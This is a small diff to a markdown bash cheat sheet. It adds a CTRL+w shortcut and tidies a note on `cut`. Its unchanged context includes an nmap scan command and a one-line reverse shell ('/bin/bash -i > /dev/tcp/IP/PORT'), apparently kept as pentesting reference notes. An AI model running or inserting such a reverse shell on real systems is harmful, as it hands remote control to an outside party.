@@ -24,6 +24,9 @@ CTRL + d
 ```bash
 ESC + Backspace
 ```
+```bash
+CTRL + w
+```
 
 * Clears one word to the right of the cursor
 ```bash
@@ -39,6 +42,7 @@ ESC + d
 ```bash
 nmap -A IP
 ```
+
 * Interactive bash shell
 ```bash
 /bin/bash -i > /dev/tcp/IP/PORT 0<&1 2>&1
@@ -71,7 +75,7 @@ echo "Hello World" | awk '{print $1}'
 echo -e "Hello \n World"
 ```
 
-* `cut` (returns Hello) `-d`: deliminator, `-f`: field (fields are indexed from 1)
+* `cut` (returns Hello) `-d`: deliminator, `-f`: field (fields are indexed from `1`)
 ```bash
 echo "Hello World" | cut -d ' ' -f 1
 ```
